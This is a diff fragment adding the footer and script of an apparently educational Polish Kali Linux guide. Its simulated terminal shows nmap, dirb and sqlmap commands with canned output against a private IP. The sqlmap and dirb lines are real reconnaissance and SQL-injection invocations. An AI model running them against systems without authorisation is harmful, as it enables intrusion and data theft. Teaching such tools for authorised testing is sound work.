+    <!-- FOOTER -->
+    <footer>
+        <h3>🐉 Kali Linux Advanced Guide</h3>
+        <p>Zaawansowany przewodnik po narzędziach penetracyjnych Kali Linux 2024.</p>
+        <div class="footer-links">
+            <a href="https://www.kali.org/docs/" target="_blank">Official Docs</a>
+            <a href="https://www.offensive-security.com/" target="_blank">Offensive Security</a>
+            <a href="https://www.exploit-db.com/" target="_blank">Exploit Database</a>
+            <a href="https://github.com/khast3x/h8mail" target="_blank">OSINT Tools</a>
+            <a href="https://pentestbook.six2dez.com/" target="_blank">Pentest Book</a>
+        </div>
+        <p style="font-size: 0.85rem; opacity: 0.6; margin-top: 20px;">
+            <strong>⚠️ Legal Disclaimer:</strong> Ten przewodnik ma wyłącznie edukacyjny cel. Używaj narzędzi tylko na systemach, na które masz pisemne pozwolenie do testów.
+        </p>
+    </footer>
+
+    <!-- ===== SKRYPTY ===== -->
+    <script>
+        // =====================
+        // INTERAKTYWNY TERMINAL
+        // =====================
+        const commandTemplates = {
+            'nmap': {
+                command: 'nmap -sV -sC -p- 192.168.1.100',
+                output: [
+                    'Starting Nmap 7.92 ( https://nmap.org )',
+                    'Nmap scan report for 192.168.1.100',
+                    'Host is up (0.045s latency).',
+                    'Not shown: 65530 closed ports',
+                    'PORT     STATE SERVICE     VERSION',
+                    '22/tcp   open  ssh         OpenSSH 8.4p1 Ubuntu',
+                    '80/tcp   open  http        Apache httpd 2.4.46',
+                    '443/tcp  open  ssl/http    Apache httpd 2.4.46',
+                    '3306/tcp open  mysql       MySQL 8.0.27',
+                    '8080/tcp open  http-proxy  Apache Tomcat',
+                    'Service detection performed. Please report any incorrect results.',
+                    'Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds'
+                ]
+            },
+            'dirb': {
+                command: 'dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt',
+                output: [
+                    '-----------------',
+                    'DIRB v2.22    ',
+                    'By The Dark Raver',
+                    '-----------------',
+                    'START_TIME: Tue Sep 12 10:30:00 2023',
+                    'URL_BASE: http://192.168.1.100/',
+                    'WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt',
+                    '-----------------',
+                    '',
+                    'GENERATED WORDS: 4612',
+                    '',
+                    '---- Scanning URL: http://192.168.1.100/ ----',
+                    '+ http://192.168.1.100/admin (CODE:301|SIZE:323)',
+                    '+ http://192.168.1.100/backup (CODE:301|SIZE:325)',
+                    '+ http://192.168.1.100/config (CODE:301|SIZE:325)',
+                    '+ http://192.168.1.100/phpinfo (CODE:200|SIZE:95325)',
+                    '+ http://192.168.1.100/robots.txt (CODE:200|SIZE:45)',
+                    '',
+                    '-----------------',
+                    'END_TIME: Tue Sep 12 10:30:45 2023',
+                    'DOWNLOADED: 4612 - FOUND: 5'
+                ]
+            },
+            'sqlmap': {
+                command: 'sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs',
+                output: [
+                    '        ___',
+                    '       __H__',
+                    ' ___ ___[,]_____ ___ ___  {1.6.11#stable}',
+                    '|_ -| . [,]     | .\'| . |',
+                    '|___|_  [,]_|_|_|__,|  _|',
+                    '      |_|V...       |_|   https://sqlmap.org',
+                    '',
+                    '[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.',
+                    '',
+                    '[*] starting @ 10:32:00 /2023-09-12/',
+                    '',
+                    '[10:32:00] [INFO] testing connection to the target URL',
+                    '[10:32:01] [INFO] checking if the target is protected by some WAF/IPS',
+                    '[10:32:02] [INFO] testing if the target URL content is stable',
+                    '[10:32:03] [WARNING] GET parameter "id" appears to be "MySQL >= 5.0.12 AND time-based blind" injectable',
+                    '[10:32:05] [INFO] fetching database names',
+                    '[10:32:06] [INFO] fetched data logged to text files under "/root/.local/share/sqlmap/output/192.168.1.100"',
+                    '',
+                    'available databases [5]:',
+                    '[*] information_schema',
+                    '[*] mysql',
+                    '[*] performance_schema',
+                    '[*] sys',
+                    '[*] webappdb'
+                ]
+            }
+        };
+
+        function runCommand(cmdType) {
+            const template = commandTemplates[cmdType];
+            if (!template) return;
+            
+            const terminal = document.getElementById('interactiveTerminal');
+            const currentLine = terminal.querySelector('.terminal-line:last-child');
+            
+            // Add command line
+            const commandLine = document.createElement('div');
+            commandLine.className = 'terminal-line';
+            commandLine.innerHTML = `<span class="terminal-prompt">kali@interactive:~#</span> <span class="terminal-command">${template.command}</span>`;
+            terminal.insertBefore(commandLine, currentLine);
+            
+            // Add output
+            template.output.forEach(line => {
+                const outputLine = document.createElement('div');
+                outputLine.className = 'terminal-line';
+                outputLine.innerHTML = `<span class="terminal-output">${line}</span>`;
+                terminal.insertBefore(outputLine, currentLine);
+            });
+            
+            // Scroll to bottom
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function addCommand(cmd) {
+            const terminal = document.getElementById('interactiveTerminal');
+            const currentLine = terminal.querySelector('.terminal-line:last-child');
+            
+            const commandLine = document.createElement('div');
+            commandLine.className = 'terminal-line';
+            commandLine.innerHTML = `<span class="terminal-prompt">kali@interactive:~#</span> <span class="terminal-command">${cmd}</span>`;
+            terminal.insertBefore(commandLine, currentLine);
+            
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function clearTerminal() {
+            const terminal = document.getElementById('interactiveTerminal');
+            const lines = terminal.querySelectorAll('.terminal-line');
+            
+            lines.forEach((line, index) => {
+                if (index > 0) line.remove();
+            });
+            
+            // Keep only the prompt line
+            const promptLine = terminal.querySelector('.terminal-line');
+            promptLine.innerHTML = '<span class="terminal-prompt">kali@interactive:~#</span><span class="terminal-cursor">█</span>';
+        }
+
+        // =====================
+        // ANIMACJE SCROLL
+        // =====================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animacje scroll
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            }, { threshold: 0.1 });
+
+            document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+            
+            // Płynne przewijanie dla linków nawigacyjnych
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const targetId = this.getAttribute('href');
+                    const targetElement = document.querySelector(targetId);
+                    
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+
+            // Tooltip initialization
+            document.querySelectorAll('.tooltip').forEach(tooltip => {
+                tooltip.addEventListener('mouseenter', function() {
+                    const tooltipText = this.querySelector('.tooltiptext');
+                    if (tooltipText) {
+                        tooltipText.style.visibility = 'visible';
+                        tooltipText.style.opacity = '1';
+                    }
+                });
+                
+                tooltip.addEventListener('mouseleave', function() {
+                    const tooltipText = this.querySelector('.tooltiptext');
+                    if (tooltipText) {
+                        tooltipText.style.visibility = 'hidden';
+                        tooltipText.style.opacity = '0';
+                    }
+                });
+            });
+        });
+
+        // =====================
+        // KEYBOARD SHORTCUTS
+        // =====================
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+L to clear terminal
+            if (e.ctrlKey && e.key === 'l') {
+                e.preventDefault();
+                clearTerminal();
+            }
+            
+            // Tab to cycle through tools
+            if (e.key === 'Tab') {
+                e.preventDefault();
+                const toolCards = document.querySelectorAll('.tool-card');
+                const activeElement = document.activeElement;
+                
+                if (activeElement.classList.contains('lab-btn')) {
+                    const buttons = document.querySelectorAll('.lab-btn');
+                    const currentIndex = Array.from(buttons).indexOf(activeElement);
+                    const nextIndex = (currentIndex + 1) % buttons.length;
+                    buttons[nextIndex].focus();
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
